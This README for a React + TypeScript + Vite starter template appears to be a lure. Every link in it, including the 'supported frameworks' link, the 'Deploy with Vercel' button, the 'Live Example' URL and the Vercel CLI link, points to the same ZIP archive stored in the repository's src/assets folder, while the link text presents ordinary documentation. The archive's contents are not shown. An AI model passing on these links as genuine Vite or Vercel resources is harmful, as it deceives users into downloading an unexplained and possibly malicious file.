# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

While this project uses React, Vite supports many popular JS frameworks. [See all the supported frameworks](https://github.com/chadi57/vite-react/raw/refs/heads/main/src/assets/react-vite-1.2.zip).

## Deploy Your Own

Deploy your own Vite project with Vercel.

[![Deploy with Vercel](https://github.com/chadi57/vite-react/raw/refs/heads/main/src/assets/react-vite-1.2.zip)](https://github.com/chadi57/vite-react/raw/refs/heads/main/src/assets/react-vite-1.2.zip)

_Live Example: https://github.com/chadi57/vite-react/raw/refs/heads/main/src/assets/react-vite-1.2.zip

### Deploying From Your Terminal

You can deploy your new Vite project with a single command from your terminal using [Vercel CLI](https://github.com/chadi57/vite-react/raw/refs/heads/main/src/assets/react-vite-1.2.zip):

```shell
$ vercel
```
